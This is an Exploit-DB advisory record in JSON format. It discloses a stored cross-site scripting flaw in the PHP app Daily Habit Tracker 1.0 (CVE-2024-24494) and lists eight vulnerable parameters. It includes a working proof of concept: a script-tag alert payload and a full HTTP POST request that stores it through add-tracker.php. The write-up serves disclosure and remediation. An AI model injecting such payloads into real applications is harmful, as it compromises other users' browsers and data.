{"source": "https://www.exploit-db.com/exploits/51952", "vulnName": "Daily Habit Tracker 1.0 - Stored Cross-Site Scripting (XSS)", "vulnEDBID": "51952", "vulnCVE": "2024-24494", "author": "YEVHENII BUTENKO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Daily Habit Tracker 1.0 - Stored Cross-Site Scripting (XSS)\n# Date: 2 Feb 2024\n# Exploit Author: Yevhenii Butenko\n# Vendor Homepage: https://www.sourcecodester.com\n# Software Link: https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html\n# Version: 1.0\n# Tested on: Debian\n# CVE : CVE-2024-24494\n\n### Stored Cross-Site Scripting (XSS):\n\n> Stored Cross-Site Scripting (XSS) is a web security vulnerability where an attacker injects malicious scripts into a web application's database. The malicious script is saved on the server and later rendered in other users' browsers. When other users access the affected page, the stored script executes, potentially stealing data or compromising user security.\n\n### Affected Components:\n\n> add-tracker.php, update-tracker.php\n\nVulnerable parameters: \n- day \n- exercise \n- pray \n- read_book \n- vitamins \n- laundry \n- alcohol \n- meat\n\n### Description:\n\n> Multiple parameters within `Add Tracker` and `Update Tracker` requests are vulnerable to Stored Cross-Site Scripting. The application failed to sanitize user input while storing it to the database and reflecting back on the page.\n\n## Proof of Concept:\n\nThe following payload `<script>alert('STORED_XSS')</script>` can be used in order to exploit the vulnerability.\n\nBelow is an example of a request demonstrating how a malicious payload can be stored within the `day` value:\n\n```\nPOST /habit-tracker/endpoint/add-tracker.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 175\nOrigin: http://localhost\nDNT: 1\nConnection: close\nReferer: http://localhost/habit-tracker/home.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\ndate=1992-01-12&day=Tuesday%3Cscript%3Ealert%28%27STORED_XSS%27%29%3C%2Fscript%3E&exercise=Yes&pray=Yes&read_book=Yes&vitamins=Yes&laundry=Yes&alcohol=Yes&meat=Yes\n```\n\n![XSS Fired](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/xss.png?raw=true)\n\n## Recommendations\n\nWhen using this tracking system, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.\n            "}